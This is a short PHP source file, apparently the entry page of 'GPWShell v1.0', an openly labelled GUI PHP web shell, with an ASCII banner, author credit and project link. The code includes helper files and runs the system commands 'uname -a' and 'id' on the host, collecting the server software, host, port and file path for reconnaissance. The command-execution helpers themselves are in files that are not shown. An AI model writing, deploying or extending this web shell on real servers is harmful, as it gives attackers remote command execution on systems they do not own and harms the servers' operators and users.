<!--                   
               _____ _       _ _ 
 ___ ___ _ _ _|   __| |_ ___| | |
| . | . | | | |__   |   | -_| | |
|_  |  _|_____|_____|_|_|___|_|_|
|___|_| Simple GUI PHP Web Shell  

GPWShell v1.0
Author: Carlos Padilla (cpadlab)
Proyect: https://github.com/cpadlab/GPWShell
-->

<?php

    include './other.php';
    include './get.php';

    $title = 'GPWShell';    
    $version = 'v1.0';
    $auth = 'cpadlab';
    
    $_software = getServSoftware();
    
    $_host = getHost() . ":" . getPort();
    
    $url_vars = "&" . getURLVars();
    
    $_uname_a = execCommand("uname -a");
    
    $_username_id = execCommand("id");
    
    $_located = getFilePath();
    
?>